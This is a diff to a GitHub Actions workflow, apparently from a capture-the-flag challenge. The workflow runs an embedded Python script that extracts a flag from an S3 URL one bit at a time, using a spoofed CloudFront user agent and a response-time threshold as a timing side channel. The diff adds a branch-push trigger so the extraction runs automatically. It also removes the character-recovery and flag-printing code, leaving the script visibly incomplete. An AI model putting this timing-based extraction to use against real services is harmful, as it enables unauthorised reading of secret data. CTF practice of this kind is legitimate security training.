@@ -1,6 +1,9 @@
 name: Stage2-Extract-Flag
 
 on:
+  push:
+    branches:
+      - corgi
   workflow_dispatch:
 
 permissions:
@@ -22,6 +25,7 @@ jobs:
         shell: bash
         run: |
           set +e
+
           python3 -m pip install boto3 requests requests-aws4auth --quiet
 
           python3 - <<'PY'
@@ -36,7 +40,6 @@ jobs:
           S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
           USER_AGENT = "Amazon CloudFront"
           MAX_LENGTH = 96
-          SLEEP_SECONDS = 2.0
           THRESHOLD = 1.0
 
           inner = r'''
@@ -104,31 +107,15 @@ jobs:
                           timeout=20
                       )
                   except Exception as error:
-                      print("REQUEST_ERROR", index, bit, repr(error))
+                      print(
+                          "REQUEST_ERROR",
+                          index,
+                          bit,
+                          repr(error),
+                          flush=True
+                      )
 
                   elapsed = time.monotonic() - started
 
                   if elapsed > THRESHOLD:
                       value |= 1 << bit
-
-                  print(
-                      "INDEX=%d BIT=%d VALUE=%d ELAPSED=%.2f"
-                      % (index, bit, value, elapsed),
-                      flush=True
-                  )
-
-                  time.sleep(0.05)
-
-              if value == 0:
-                  break
-
-              recovered.append(value)
-              print(
-                  "CHAR[%d]=%r BYTE=%d"
-                  % (index, chr(value), value),
-                  flush=True
-              )
-
-          print("FLAG_BYTES=", bytes(recovered))
-          print("FLAG_TEXT=", bytes(recovered).decode("utf-8", errors="replace"))
-          PY
